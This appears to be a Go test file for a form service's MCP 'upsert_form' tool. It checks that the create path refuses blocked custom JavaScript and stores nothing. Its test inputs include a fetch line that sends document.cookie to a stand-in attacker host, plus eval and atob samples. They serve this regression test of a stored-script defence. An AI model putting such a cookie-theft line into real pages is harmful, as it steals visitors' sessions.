package mcpsrv

// Card t_8b3abbde — the MCP `upsert_form` CREATE half stored an unscanned
// theme.custom_js, and the block-rendered buyer page served it as live code.
//
// THE DEFECT, measured from outside on live prod v1.21.293 (api 4a39b7bc) —
// the release that closed exactly this hole on POST /v1/rest/forms:
//
//	tools/call upsert_form {"title":"mcp-cjs-probe","theme":{"custom_js":"eval('2+2');"}}
//	  -> {"status":"created","form_id":"…"} with no isError
//	  -> `select theme->>'custom_js' from forms` returned eval('2+2'); verbatim
//	  -> after PATCHing only `config` (theme untouched) and publishing,
//	     GET https://<ws>.jomform.com/<slug> served
//	     <script>eval('2+2');</script>
//
// while the SAME value on the same build was 400 `custom_js ditolak: active code
// execution marker: eval(` from POST and PATCH /v1/rest/forms, and isError from
// set_form_theme (form_creation.go). One rule, two answers.
//
// CAUSE: `upsertForm` had exactly one `customform.ScanCustomJS` arm, and it sat
// BELOW the create branch's `return ... {"status": "created"}` — so it guarded
// the update half only. Pre-existing: `git show 98d4fd6f:api/internal/mcpsrv/
// parity.go` has the same order, it is not a v1.21.293 regression.
//
// The arm now sits above the create/update split, so no branch of the tool can
// reach Forms.Create (or Forms.Update) without passing it.
//
// These tests drive the REAL streamable-HTTP transport with a real API key
// against real Postgres, and assert on the ROW as well as the result — "isError
// and nothing stored" is the whole contract, and a guard that answered isError
// after the INSERT would still ship the defect.
//
// BITE (measured, see the handoff): with parity.go reverted to the shipped
// ordering, TestUpsertFormCreateRefusesBlockedCustomJS fails (the call answers
// status:created and the row holds the marker) while
// TestUpsertFormUpdateRefusesBlockedCustomJS and the benign/omitted arms stay
// green — so the failure names the create hole, not the scan or the route.
//
// Skipped without JOMFORM_TEST_DATABASE_URL, like every DB-backed test here.

import (
	"context"
	"errors"
	"strings"
	"testing"

	"github.com/jackc/pgx/v5"
	"github.com/jackc/pgx/v5/pgxpool"

	"github.com/wzul/jomform/api/internal/testdb"
)

// cjsFormCountBySlug counts live rows for one slug. A REFUSED create must leave
// zero: for a refused write the absence of the row IS the expectation, so a
// missing row is a pass, never a failure.
func cjsFormCountBySlug(t *testing.T, pool *pgxpool.Pool, accountID, slug string) int {
	t.Helper()
	var n int
	if err := pool.QueryRow(context.Background(),
		`SELECT count(*) FROM forms WHERE slug=$1 AND account_id=$2 AND deleted_at IS NULL`,
		slug, accountID).Scan(&n); err != nil {
		t.Fatalf("count forms for slug %q: %v", slug, err)
	}
	return n
}

// cjsStoredJS reads theme->>'custom_js' straight out of the database. The
// second result is false when the form has no live row or no such key.
func cjsStoredJS(t *testing.T, pool *pgxpool.Pool, accountID, slug string) (string, bool) {
	t.Helper()
	var js *string
	err := pool.QueryRow(context.Background(),
		`SELECT theme->>'custom_js' FROM forms WHERE slug=$1 AND account_id=$2 AND deleted_at IS NULL`,
		slug, accountID).Scan(&js)
	if errors.Is(err, pgx.ErrNoRows) {
		return "", false
	}
	if err != nil {
		t.Fatalf("read stored theme.custom_js for %q: %v", slug, err)
	}
	if js == nil {
		return "", false
	}
	return *js, true
}

// cjsSlug builds a per-call unique slug out of the fixture account id (a fresh
// uuid every run) plus a case label, so cases cannot collide with each other or
// with rows left by an earlier run in the same schema.
func cjsSlug(accountID, label string) string {
	flat := strings.ReplaceAll(accountID, "-", "")
	return "mcp-cjs-" + label + "-" + flat[:10]
}

// TestUpsertFormCreateRefusesBlockedCustomJS is the card's acceptance criterion
// on the exact surface the defect was measured on: an upsert_form call with an
// EMPTY form_id (the create half) carrying a blocked marker must be refused as
// an MCP tool error with the same sentence the other doors answer, and must
// leave no form row.
func TestUpsertFormCreateRefusesBlockedCustomJS(t *testing.T) {
	requireTestDB(t)
	pool := testdb.Open(t)
	_, _, accountID, rawKey := wsMCPUserWorkspaces(t, pool, "cjsc", 1)
	httpSrv := wsMCPFixture(t, pool)

	blocked := []struct {
		name       string
		js         string
		wantReason string
	}{
		{"eval", "eval('2+2');", "active code execution marker: eval("},
		{"atob", "var x = atob('ZXZhbCgyKzIp');", "obfuscation/beacon marker: atob("},
		{"external-url", "fetch('http://evil.example/collect?c=' + document.cookie);", "reference to external URL from custom JS"},
	}
	for _, tc := range blocked {
		slug := cjsSlug(accountID, "blocked-"+tc.name)
		res := mcpCall(t, httpSrv.URL, rawKey, "upsert_form", map[string]any{
			"title": "mcp cjs blocked " + tc.name,
			"slug":  slug,
			"theme": map[string]any{"custom_js": tc.js},
		})
		isErr, msg := refused(res)
		if !isErr {
			t.Fatalf("upsert_form CREATE (form_id omitted) with custom_js %q (%s) answered %s with NO "+
				"isError.\nThat IS the carded defect: the create half of upsert_form stores the value "+
				"unscanned while its update half, set_form_theme and both REST form routes answer "+
				"`custom_js ditolak: …` for the identical string — and since v1.21.283 the "+
				"block-rendered buyer page executes what was stored.",
				tc.js, tc.name, toolResultText(t, res))
		}
		if !strings.Contains(msg, "custom_js ditolak: ") {
			t.Errorf("refusal for %s = %q, want it to carry `custom_js ditolak: <reason>` — the same "+
				"wording the other three form write doors answer, so one rule reads one way", tc.name, msg)
		}
		if !strings.Contains(msg, tc.wantReason) {
			t.Errorf("refusal for %s = %q, want it to name the reason %q the shared scan gives",
				tc.name, msg, tc.wantReason)
		}
		// A refused write must leave nothing behind — the row is the defect.
		if n := cjsFormCountBySlug(t, pool, accountID, slug); n != 0 {
			t.Fatalf("%d live forms on %q after a refused create, want 0 — the blocked JS was "+
				"stored anyway", n, slug)
		}
		if js, ok := cjsStoredJS(t, pool, accountID, slug); ok {
			t.Fatalf("a refused create left theme.custom_js = %q on the row", js)
		}
	}
}

// TestUpsertFormCreateStoresBenignCustomJSVerbatim is the other half of the
// contract: the scan refuses markers, not the feature. A legitimate
// form-behaviour script (event handlers are the norm for custom_js, which is
// why this scan is not the assetgate one) must still create, and must be stored
// unchanged — with the value the buyer's page will serve.
func TestUpsertFormCreateStoresBenignCustomJSVerbatim(t *testing.T) {
	requireTestDB(t)
	pool := testdb.Open(t)
	_, _, accountID, rawKey := wsMCPUserWorkspaces(t, pool, "cjsb", 1)
	httpSrv := wsMCPFixture(t, pool)

	js := "document.addEventListener('submit', function () { window.__jfOk = 1; });"
	slug := cjsSlug(accountID, "benign")
	created := succeeded(t, mcpCall(t, httpSrv.URL, rawKey, "upsert_form", map[string]any{
		"title": "mcp cjs benign",
		"slug":  slug,
		"theme": map[string]any{"primary": "#5e6ad2", "custom_js": js},
	}))
	if created["status"] != "created" {
		t.Fatalf("upsert_form CREATE with a benign custom_js returned %v, want status=created — the "+
			"scan must refuse markers, not merchant behaviour JS", created)
	}
	if id, _ := created["form_id"].(string); id == "" {
		t.Fatalf("upsert_form CREATE returned %v with no form_id", created)
	}
	got, ok := cjsStoredJS(t, pool, accountID, slug)
	if !ok {
		t.Fatalf("no theme.custom_js stored on %q after a benign create — the value the agent sent "+
			"is what the buyer's page will run, so it must survive verbatim", slug)
	}
	if got != js {
		t.Errorf("stored theme.custom_js = %q, want the value sent verbatim (%q)", got, js)
	}
}

// TestUpsertFormCreateWithoutCustomJSStillCreates pins the "empty means keep
// creating" side of the contract, so the fix cannot be a blanket refusal: an
// omitted `theme`, a `theme` without the key, an empty string and an explicit
// JSON null must all still create a form.
func TestUpsertFormCreateWithoutCustomJSStillCreates(t *testing.T) {
	requireTestDB(t)
	pool := testdb.Open(t)
	_, _, accountID, rawKey := wsMCPUserWorkspaces(t, pool, "cjsn", 1)
	httpSrv := wsMCPFixture(t, pool)

	cases := []struct {
		name  string
		args  map[string]any
		label string
	}{
		{"theme omitted", map[string]any{}, "no-theme"},
		{"no custom_js key", map[string]any{"theme": map[string]any{"primary": "#000"}}, "no-key"},
		{"empty custom_js", map[string]any{"theme": map[string]any{"custom_js": ""}}, "empty"},
		{"null custom_js", map[string]any{"theme": map[string]any{"custom_js": nil}}, "null"},
	}
	for _, tc := range cases {
		slug := cjsSlug(accountID, tc.label)
		args := map[string]any{"title": "mcp cjs " + tc.name, "slug": slug}
		for k, v := range tc.args {
			args[k] = v
		}
		out := succeeded(t, mcpCall(t, httpSrv.URL, rawKey, "upsert_form", args))
		if out["status"] != "created" {
			t.Errorf("upsert_form CREATE with %s returned %v, want status=created — an absent/empty "+
				"custom_js is not a blocked value and must keep working", tc.name, out)
		}
		if n := cjsFormCountBySlug(t, pool, accountID, slug); n != 1 {
			t.Errorf("upsert_form CREATE with %s left %d live rows on %q, want 1", tc.name, n, slug)
		}
	}
}

// TestUpsertFormUpdateRefusesBlockedCustomJS is the control that proves the
// other half of the tool still answers as it did before the fix — and, run
// against the shipped ordering, stays green while the create test fails, so the
// bite names the create branch rather than the scan.
func TestUpsertFormUpdateRefusesBlockedCustomJS(t *testing.T) {
	requireTestDB(t)
	pool := testdb.Open(t)
	_, _, accountID, rawKey := wsMCPUserWorkspaces(t, pool, "cjsu", 1)
	httpSrv := wsMCPFixture(t, pool)

	slug := cjsSlug(accountID, "update")
	created := succeeded(t, mcpCall(t, httpSrv.URL, rawKey, "upsert_form", map[string]any{
		"title": "mcp cjs update", "slug": slug,
	}))
	formID, _ := created["form_id"].(string)
	if formID == "" {
		t.Fatalf("seed create returned %v with no form_id", created)
	}

	const blocked = "eval('2+2');"
	res := mcpCall(t, httpSrv.URL, rawKey, "upsert_form", map[string]any{
		"form_id": formID,
		"title":   "mcp cjs update",
		"theme":   map[string]any{"custom_js": blocked},
	})
	isErr, msg := refused(res)
	if !isErr {
		t.Fatalf("upsert_form UPDATE with a blocked custom_js answered %s with no isError",
			toolResultText(t, res))
	}
	if !strings.Contains(msg, "custom_js ditolak: active code execution marker: eval(") {
		t.Errorf("update refusal = %q, want `custom_js ditolak: active code execution marker: eval(`", msg)
	}
	if js, ok := cjsStoredJS(t, pool, accountID, slug); ok {
		t.Fatalf("a refused update left theme.custom_js = %q on the row", js)
	}
	// A benign value on the same form is accepted and stored — the refusal is
	// about the marker, not about the update path being broken for everyone.
	benign := "document.addEventListener('submit', function () { window.__jfUpd = 1; });"
	upd := succeeded(t, mcpCall(t, httpSrv.URL, rawKey, "upsert_form", map[string]any{
		"form_id": formID,
		"title":   "mcp cjs update",
		"theme":   map[string]any{"custom_js": benign},
	}))
	if upd["status"] != "updated" {
		t.Fatalf("benign update returned %v, want status=updated", upd)
	}
	if got, ok := cjsStoredJS(t, pool, accountID, slug); !ok || got != benign {
		t.Errorf("stored theme.custom_js after a benign update = %q (present=%v), want %q",
			got, ok, benign)
	}
}
